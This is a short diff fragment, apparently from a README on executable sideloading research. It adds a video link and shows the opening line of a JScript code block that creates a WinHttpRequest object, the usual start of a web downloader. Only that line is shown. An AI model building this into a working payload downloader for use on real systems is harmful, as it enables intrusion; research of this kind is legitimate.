@@ -6,6 +6,7 @@
 </p>
 
 https://github.com/jreegun/Researches/tree/master/Exe%20Sideloading
+https://youtu.be/3aZM0Rfjgy4
 
 ````
 var  WinHttpReq  =  new  ActiveXObject ( "WinHttp.WinHttpRequest.5.1" ) ; 
